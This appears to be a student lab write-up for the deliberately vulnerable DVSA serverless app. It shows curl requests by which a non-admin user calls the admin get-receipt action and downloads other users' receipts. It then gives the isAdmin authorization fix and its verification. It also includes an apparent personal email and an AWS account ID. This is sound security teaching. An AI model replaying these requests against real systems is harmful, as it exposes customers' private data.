# Lesson 3: Sensitive Information Disclosure

## Part 1) Goal and Vulnerability Summary
This lesson demonstrates a sensitive information disclosure vulnerability in DVSA's receipt retrieval workflow. The affected component is the DVSA-ADMIN-GET-RECEIPT Lambda function, which is intended to be an admin-only operation but is accessible by any authenticated regular user. The security impact is that any user can generate a pre-signed S3 URL to download receipt files containing other users' order details, including names, addresses, items purchased, and payment totals. The root weakness is the complete absence of authorization checks before invoking a privileged administrative function.

## Part 2) Why This Works / Root Cause
The vulnerability exists because the DVSA-ORDER-MANAGER Lambda function routes the `get-receipt` action directly to `DVSA-ADMIN-GET-RECEIPT` without verifying whether the requesting user has admin privileges. Although the code retrieves the `isAdmin` flag from Cognito, it never actually checks it before invoking the receipt function. This means any authenticated user who knows the API action name can call an admin-only function and obtain sensitive receipt data.

## Part 3) Environment and Setup
- DVSA URL: https://nuxbyqip03.execute-api.us-east-1.amazonaws.com/Stage/order
- AWS Region: us-east-1
- Lambda functions involved:
  - DVSA-ORDER-MANAGER — routes API actions
  - DVSA-ADMIN-GET-RECEIPT — generates pre-signed S3 receipt URLs
- S3 Bucket: dvsa-receipts-bucket-577211135850-us-east-1
- Tools used: curl, python3, AWS CloudShell, browser DevTools
- User context: Regular non-admin user (Lamees)

## Part 4) Reproduction Steps

**Step 1** — Get a valid JWT token: Log into DVSA, open DevTools (F12) → Network → Fetch/XHR → click any order request → copy the Authorization header value.

```bash
export API="https://nuxbyqip03.execute-api.us-east-1.amazonaws.com/Stage/order"
export TOKEN="YOUR_JWT_TOKEN_HERE"
```

**Step 2** — Create a new order:

```bash
curl -s "$API" \
  -H "content-type: application/json" \
  -H "authorization: $TOKEN" \
  --data-raw '{"action":"new","cart-id":"cart001","items":{"1":1}}' | python3 -m json.tool
```

**Step 3** — Add shipping details:

```bash
curl -s "$API" \
  -H "content-type: application/json" \
  -H "authorization: $TOKEN" \
  --data-raw '{"action":"shipping","order-id":"ORDER_ID_HERE","data":{"address":"123 Test St","email":"harbilamees86@gmail.com","name":"Lamees"}}' | python3 -m json.tool
```

**Step 4** — Complete billing:

```bash
curl -s "$API" \
  -H "content-type: application/json" \
  -H "authorization: $TOKEN" \
  --data-raw '{"action":"billing","order-id":"ORDER_ID_HERE","data":{"ccn":"4111111111111111","exp":"12/26","cvv":"123"}}' | python3 -m json.tool
```

**Step 5** — Call the admin receipt function as a regular user:

```bash
curl -s "$API" \
  -H "content-type: application/json" \
  -H "authorization: $TOKEN" \
  --data-raw '{"action":"get-receipt","order-id":"6bcdc319-d2c1-420a-9797-fa876d7bf329","year":"2026","month":"04","day":"25"}' | python3 -m json.tool
```

## Part 5) Evidence and Proof

The exploit returned a pre-signed S3 URL:

```json
{
    "status": "ok",
    "download_url": "https://dvsa-receipts-bucket-577211135850-us-east-1.s3.amazonaws.com/zip/2026-04-25-dvsa-order-receipts.zip?AWSAccessKeyId=..."
}
```

Opening the URL in the browser downloaded a zip file containing a receipt with the following sensitive data:
Order: 71VKHp0gGtLO
To:
Lamees
123 Test St
Items:
45    Super Mario 2 (1)
Total: $45

This confirms that a regular non-admin user was able to access and download sensitive receipt data that should be restricted to administrators only.

*(See screenshots: Exploit1.png and Exploit2.png)*

## Part 6) Fix Strategy / Probable Mitigation
The fix belongs in the DVSA-ORDER-MANAGER Lambda function, specifically in the `get-receipt` case of the switch statement. Before invoking `DVSA-ADMIN-GET-RECEIPT`, the code must check whether the authenticated user has admin privileges using the `isAdmin` flag already retrieved from Cognito. If the user is not an admin, the function should immediately return a 403 Forbidden response without invoking the receipt function. This directly addresses the root cause by enforcing role-based access control at the routing layer.

## Part 7) Code / Config Changes

**File:** DVSA-ORDER-MANAGER/order-manager.js

**Before (vulnerable):**

```javascript
case "get-receipt":
    payload = { 
        "user": user, 
        "order-id": req["order-id"], 
        "isAdmin": isAdmin,
        "year": req["year"],
        "month": req["month"],
        "day": req["day"]
    };
    functionName = "DVSA-ADMIN-GET-RECEIPT";
    break;
```

*(See screenshot: Vulnerable Code.png)*

**After (fixed):**

```javascript
case "get-receipt":
    if (!isAdmin) {
        const response = {
            statusCode: 403,
            headers: corsHeaders,
            body: JSON.stringify({ "status": "err", "msg": "Forbidden: admin only" })
        };
        callback(null, response);
        return;
    }
    payload = { 
        "user": user, 
        "order-id": req["order-id"], 
        "isAdmin": isAdmin,
        "year": req["year"],
        "month": req["month"],
        "day": req["day"]
    };
    functionName = "DVSA-ADMIN-GET-RECEIPT";
    break;
```

**What changed:** Added an `if (!isAdmin)` check that immediately returns a 403 Forbidden response before the receipt function is ever invoked, ensuring only admin users can proceed.

*(See screenshot: Fix Code.png)*

## Part 8) Verification After Fix

Running the same curl command after deploying the fix returned:

```json
{
    "status": "err",
    "msg": "Forbidden: admin only"
}
```

The pre-signed URL is no longer returned to non-admin users. The fix successfully blocks unauthorized access to the receipt function while the legitimate admin workflow remains intact.

*(See screenshot: Verification after fix.png)*

## Part 9) Structured Operation and Security Analysis

**Part A — Intended Logic and Behavior Comparison:**

The vulnerability is Sensitive Information Disclosure. The intended rule is that only admin users may invoke `DVSA-ADMIN-GET-RECEIPT` and obtain receipt download URLs — regular users must never access other users' receipt data. The artifacts used to infer this rule include the DVSA order workflow, API request and response captures, the order-manager.js source code, the Cognito `isAdmin` attribute, CloudShell curl output, and the downloaded receipt file.

Under normal intended behavior, a regular user calling the `get-receipt` action should receive a 403 Forbidden response with no URL returned. Under the exploit, a regular non-admin user calling the same action received a valid pre-signed S3 URL and successfully downloaded a zip file containing sensitive order receipt data including customer name, address, items purchased, and order total.

**Part B — Deviation Analysis and Fix:**

The exploit represents a security deviation because the backend retrieved the `isAdmin` flag from Cognito but never enforced it before invoking the admin receipt function. This violates the intended authorization boundary because unprivileged users could access restricted administrative functionality and download sensitive receipt files. This is classified as intentional misuse / security-relevant abuse.

The fix was applied in the `get-receipt` case of `DVSA-ORDER-MANAGER/order-manager.js` by adding an `if (!isAdmin)` authorization check before invoking `DVSA-ADMIN-GET-RECEIPT`. After the fix, the same request from a non-admin user returns `{"status":"err","msg":"Forbidden: admin only"}` with no URL generated, confirming the issue is resolved.

## Part 10) Takeaway / Lessons Learned
This lesson highlights a critical secure design principle: retrieving authorization data is not the same as enforcing it. The application correctly fetched the `isAdmin` flag from Cognito but failed to actually use it to gate access. In serverless architectures this is especially dangerous because each Lambda function is independently invokable, and a single missing authorization check at the routing layer can expose an entire privileged workflow. The general principle that prevents this class of vulnerability is explicit server-side authorization enforcement — every sensitive action must verify the caller's privileges immediately before execution, not merely retrieve them.
